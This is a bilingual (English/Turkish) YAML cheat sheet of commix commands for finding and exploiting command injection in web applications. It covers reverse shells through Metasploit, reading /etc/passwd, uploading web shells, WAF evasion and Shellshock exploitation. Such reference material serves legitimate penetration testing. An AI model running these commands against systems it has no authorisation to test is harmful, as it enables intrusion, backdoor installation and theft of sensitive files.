tool: commix
tags: [web, security, pentest, exploitation, vulnerability-scanner, command-injection]

actions:
# === TARGETING & BASIC SCANNING ===

 - title:
     en: commix - basic GET request scan
     tr: commix - temel GET isteği taraması
   desc:
     en: |
       Performs a basic scan on a target URL to identify command injection vulnerabilities in GET parameters.
       The tool will automatically test all available parameters unless specified otherwise.
       This is the most common starting point for assessing simple web forms or API endpoints.
       It uses multiple injection techniques including results-based and blind injections.
     tr: |
       Hedef URL üzerinde GET parametrelerindeki komut çalıştırma zafiyetlerini belirlemek için temel tarama yapar.
       Araç, ayrıca belirtilmedikçe bütün kullanılabilir parametreleri otomatik biçimde sınar.
       Basit web formları ya da API uçlarını değerlendirmek için en yaygın başlangıç noktasıdır.
       Sonuç tabanlı ile kör enjeksiyonlar dahil çoklu enjeksiyon teknikleri kullanır.
   command: "commix --url {{url}}"

 - title:
     en: commix - scan with POST data
     tr: commix - POST verisiyle tarama
   desc:
     en: |
       Tests for command injection within the body of a POST request.
       You should provide the data string exactly as it is sent by the browser.
       Using the 'INJECT_HERE' string helps the tool identify the specific parameter you want to test.
       This is ideal for testing login forms, search bars, or any data-submission interface.
     tr: |
       POST isteğinin gövdesindeki komut çalıştırma zafiyetlerini sınar.
       Veri dizesi tarayıcının gönderdiği biçimiyle aynen verilmelidir.
       'INJECT_HERE' dizesi sınanmak istenen parametreyi araca gösterir.
       Oturum açma formları, arama kutuları ya da benzeri veri gönderen arayüzler için idealdir.
   command: "commix --url {{url}} --data='{{parameter}}=INJECT_HERE'"

 - title:
     en: commix - scan using raw request file
     tr: commix - ham istek dosyasıyla tarama
   desc:
     en: |
       Loads the entire HTTP request from a text file, which is usually exported from a proxy like Burp Suite.
       This method is highly recommended for complex requests involving specific headers, cookies, and formatting.
       It ensures that the environment during testing matches the real-world request exactly.
       Use this when you need to maintain a complex session or stateful interaction.
     tr: |
       HTTP isteğinin tamamını genellikle Burp Suite gibi vekil araçtan dışa aktarılan metin dosyasından yükler.
       Özel başlıklar, çerezler ile biçimlendirme içeren karmaşık istekler için özellikle önerilir.
       Test ortamının gerçek isteği birebir yansıtmasını sağlar.
       Karmaşık oturum ya da durum bilgisi taşıyan etkileşimleri korumak için kullanılır.
   command: "commix -r {{request_file|request.txt}}"

# === REQUEST CUSTOMIZATION ===

 - title:
     en: commix - scan with cookies and headers
     tr: commix - çerez ile başlıklarla tarama
   desc:
     en: |
       Enables testing on pages that require authentication or specific session cookies.
       You can also provide custom HTTP headers like 'X-Forwarded-For' to test for injection in logging or headers.
       This is essential for bypassing authentication walls and testing the internal logic of a web application.
       Make sure the session is active, as expired cookies will lead to inaccurate results.
     tr: |
       Kimlik doğrulama ya da özel oturum çerezleri gerektiren sayfaların sınanmasını sağlar.
       Günlükleme ya da başlık alanlarındaki enjeksiyonları sınamak üzere 'X-Forwarded-For' gibi özel HTTP başlıkları da verilebilir.
       Kimlik doğrulama duvarlarını aşmak ile web uygulamasının iç mantığını sınamak için vazgeçilmezdir.
       Süresi dolmuş çerezler yanlış sonuçlara yol açar, bu yüzden oturumun etkin olması gerekir.
   command: "commix --url {{url}} --cookie='{{cookie|PHPSESSID=12345}}' --header='{{header|X-Forwarded-For: 127.0.0.1}}'"

 - title:
     en: commix - scan through a proxy
     tr: commix - vekil sunucu üzerinden tarama
   desc:
     en: |
       Routes all Commix traffic through a specified proxy server, such as Burp Suite or Tor.
       This is useful for debugging the tool's payloads or for anonymizing the source of the scan.
       The format should follow protocol://address:port (e.g., http://127.0.0.1:8080).
       Using the --tor flag is a shortcut for routing through the local Tor service.
     tr: |
       Bütün Commix trafiğini Burp Suite ya da Tor gibi belirtilen vekil sunucudan geçirir.
       Araç yüklerini incelemek ya da tarama kaynağını gizlemek için yararlıdır.
       Adres biçimi protokol://adres:port düzenini izlemelidir.
       --tor bayrağı yerel Tor servisi üzerinden yönlendirme için kısayoldur.
   command: "commix --url {{url}} --proxy={{proxy|http://127.0.0.1:8080}}"

# === ENUMERATION ===

 - title:
     en: commix - system information enumeration
     tr: commix - sistem bilgisi toplama
   desc:
     en: |
       Attempts to gather detailed information about the underlying operating system once an injection point is found.
       It retrieves data such as the current user, hostname, kernel version, and architecture.
       This command is useful for post-exploitation planning and understanding the environment's constraints.
       Note that results depend on the privileges of the user running the web service.
     tr: |
       Enjeksiyon noktası bulunduktan sonra alttaki işletim sistemi hakkında ayrıntılı bilgi toplamaya çalışır.
       Geçerli kullanıcı, ana bilgisayar adı, çekirdek sürümü ile mimari gibi verileri alır.
       Sömürü sonrası planlama ile ortam kısıtlarını anlamak için yararlıdır.
       Sonuçlar web servisini çalıştıran kullanıcının ayrıcalıklarına bağlıdır.
   command: "commix --url {{url}} --sys-info"

 - title:
     en: commix - check for root/admin privileges
     tr: commix - kök ile yönetici yetkisi denetimi
   desc:
     en: |
       Checks if the current user on the target system has administrative or root-level privileges.
       This is a critical step in a penetration test to determine the potential impact of the vulnerability.
       High privileges allow for deeper system access, such as reading password files or installing backdoors.
       It uses logic tailored for both Linux (is-root) and Windows (is-admin) systems.
     tr: |
       Hedef sistemdeki geçerli kullanıcının yönetici ya da kök düzeyinde ayrıcalık taşıyıp taşımadığını denetler.
       Zafiyetin olası etkisini belirlemek için sızma testlerinde kritik bir adımdır.
       Yüksek ayrıcalıklar parola dosyalarını okuma ya da arka kapı kurma gibi derin sistem erişimlerine kapı aralar.
       Linux (is-root) ile Windows (is-admin) sistemlerine uyarlanmış mantık kullanır.
   command: "commix --url {{url}} --is-root"

# === EXPLOITATION & SHELLS ===

 - title:
     en: commix - drop into pseudo-shell
     tr: commix - sözde kabuğa geçme
   desc:
     en: |
       Provides an interactive command-line interface on the target system after a successful injection.
       This pseudo-shell allows you to execute OS commands as if you had direct terminal access.
       It is not a full TTY shell, but it simulates the experience by wrapping injections into a prompt.
       Use this for manual exploration and local enumeration of the target server.
     tr: |
       Başarılı enjeksiyon sonrasında hedef sistemde etkileşimli komut satırı arayüzü sunar.
       Bu sözde kabuk, doğrudan uçbirim erişimi varmış gibi işletim sistemi komutları yürütmeyi sağlar.
       Tam TTY kabuk değildir, ancak enjeksiyonları komut istemine sararak benzer deneyim sunar.
       Hedef sunucuda el ile keşif ile yerel numaralandırma için kullanılır.
   command: "commix --url {{url}} --os-shell"

 - title:
     en: commix - reverse shell via Metasploit
     tr: commix - Metasploit ile ters bağlantı
   desc:
     en: |
       Automates the creation and execution of a reverse shell payload using the Metasploit Framework.
       You must have Metasploit installed on your local machine for this feature to work properly.
       It will attempt to bypass various restrictions to establish a stable connection back to your listener.
       This is often the preferred method for transitioning from command injection to full system control.
     tr: |
       Metasploit çatısı kullanılarak ters bağlantı yükünün oluşturulması ile çalıştırılmasını otomatikleştirir.
       Bu özelliğin düzgün çalışması için yerel makinede Metasploit kurulu olmalıdır.
       Dinleyiciye kararlı bağlantı kurmak üzere çeşitli kısıtlamaları aşmaya çalışır.
       Komut çalıştırma aşamasından tam sistem denetimine geçişte çoğunlukla yeğlenen yöntemdir.
   command: "commix --url {{url}} --reverse-tcp"

# === FILE OPERATIONS ===

 - title:
     en: commix - read remote file
     tr: commix - uzaktaki dosyayı okuma
   desc:
     en: |
       Attempts to read the contents of a specific file from the target's filesystem using the injection vulnerability.
       This is highly effective for stealing configuration files, source code, or sensitive system data like /etc/passwd.
       You must provide the absolute path to the file you wish to retrieve.
       The success of this action depends on the file permissions of the web server user.
     tr: |
       Enjeksiyon zafiyeti kullanılarak hedef dosya sistemindeki belirli dosyanın içeriğini okumaya çalışır.
       Yapılandırma dosyaları, kaynak kodu ya da /etc/passwd gibi hassas sistem verilerini almakta oldukça etkilidir.
       Alınmak istenen dosyanın mutlak yolu verilmelidir.
       İşlemin başarısı web sunucusu kullanıcısının dosya izinlerine bağlıdır.
   command: "commix --url {{url}} --file-read={{remote_file|/etc/passwd}}"

 - title:
     en: commix - upload local file to host
     tr: commix - yerel dosyayı hedefe yükleme
   desc:
     en: |
       Uploads a file from your local machine to a specific directory on the target server.
       You must specify both the local source path and the remote destination path.
       This can be used to upload web shells, scripts, or other post-exploitation tools.
       Ensure that the destination directory is writable by the web server user.
     tr: |
       Yerel makinedeki dosyayı hedef sunucudaki belirli dizine yükler.
       Yerel kaynak yolu ile uzak hedef yolu birlikte belirtilmelidir.
       Web kabukları, betikler ya da sömürü sonrası araçları yüklemek için kullanılabilir.
       Hedef dizinin web sunucusu kullanıcısı tarafından yazılabilir olması gerekir.
   command: "commix --url {{url}} --file-upload={{local_file}} --file-dest={{remote_path|/tmp/shell.php}}"

# === ADVANCED DETECTION & EVASION ===

 - title:
     en: commix - advanced detection level and tampering
     tr: commix - gelişmiş tespit düzeyi ile oynama
   desc:
     en: |
       Increases the depth of testing by setting a higher level (up to 3) for more exhaustive injection attempts.
       It also applies tamper scripts to modify the payloads, which helps in bypassing WAF or IPS filters.
       Level 3 includes more time-consuming and invasive checks that might find hidden vulnerabilities.
       Use this when basic scans fail but you strongly suspect a vulnerability exists.
     tr: |
       Test derinliğini yükselterek daha kapsamlı enjeksiyon denemeleri yapar, düzey 3 düzeyine kadar çıkar.
       Yükleri değiştiren oynama betikleri WAF ya da IPS filtrelerini aşmaya yardımcı olur.
       3 düzeyi, gizli zafiyetleri bulabilen daha yavaş ile müdahaleci denetimleri içerir.
       Temel taramalar başarısız olduğu ancak zafiyetten güçlü biçimde kuşkulanıldığı durumlarda kullanılır.
   command: "commix --url {{url}} --level=3 --tamper={{tamper_script|base64encode}}"

 - title:
     en: commix - exploit Shellshock
     tr: commix - Shellshock açığını kullanma
   desc:
     en: |
       Specifically targets the Shellshock (CVE-2014-6271) vulnerability in web applications.
       This module focuses on injecting payloads through HTTP headers that are often processed by vulnerable Bash versions.
       It is particularly effective against older CGI-based web servers and legacy systems.
       Shellshock allows for immediate and often high-privileged command execution.
     tr: |
       Web uygulamalarındaki Shellshock (CVE-2014-6271) zafiyetini hedefler.
       Modül, zafiyetli Bash sürümlerince işlenen HTTP başlıkları üzerinden yük enjekte etmeye odaklanır.
       Eski CGI tabanlı web sunucuları ile köklü sistemlere karşı özellikle etkilidir.
       Shellshock çoğunlukla doğrudan ve yüksek ayrıcalıklı komut yürütmeye kapı aralar.
   command: "commix --url {{url}} --shellshock"
